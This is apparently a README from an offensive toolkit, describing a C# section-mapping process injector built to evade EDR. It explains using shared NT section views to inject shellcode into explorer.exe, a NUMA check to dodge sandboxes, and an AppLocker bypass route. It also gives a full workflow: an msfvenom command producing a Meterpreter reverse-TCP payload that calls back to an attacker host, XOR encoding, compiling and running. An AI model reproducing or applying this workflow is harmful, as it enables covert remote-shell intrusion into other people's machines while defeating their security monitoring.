# sections-injection

One file: `sections-runner.cs`. **Standalone.**

This is the most evasive injection technique in this toolkit. Use it when basic process injection (`process-injection/`) is being caught by EDR.

---

## sections-runner.cs

**Why this is more evasive than basic injection:**

Classic injection (`VirtualAllocEx` + `WriteProcessMemory`) is heavily monitored by every major EDR. This technique avoids both:

```
Instead of:
  VirtualAllocEx(target)      ← EDR hooks this
  WriteProcessMemory(target)  ← EDR hooks this

This does:
  NtCreateSection()           ← Creates shared memory (NT API)
  NtMapViewOfSection(local)   ← Map RW view into OUR process
  NtMapViewOfSection(target)  ← Map RX view into TARGET process
  memcpy(shellcode → local)   ← Looks like a local write
  CreateRemoteThread(target)  ← Only one suspicious call remains
```

Both views map the same physical memory. Writing shellcode to the local view automatically makes it appear in the target's view — no `WriteProcessMemory` into the remote process. From the EDR's perspective, there's no cross-process write.

**Sandbox evasion:** `VirtualAllocExNuma()` check at startup — exits if running in a VM that doesn't support NUMA.

---

## Workflow

```bash
# 1. Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# 2. XOR encode (key 0xfa)
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp

# 3. Paste encoded bytes into buf[] in sections-runner.cs
#    Update the size in new byte[XXX]

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "sections", Framework: .NET Framework 4.8
#    Paste sections-runner.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\sections.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:sections.exe sections-runner.cs

# 5. Run — default target process is explorer.exe
.\sections.exe
```

---

## Notes

- Default injection target: `explorer.exe`. Change the target process name in the source if needed.
- No AppLocker bypass built in. If AppLocker is an issue, compile this as the payload inside `01-evasion/applocker-bypass/installutil-bypass.cs` instead of running it directly.
- Requires admin rights if injecting into a privileged process; no admin needed for user-level processes like `explorer.exe`.
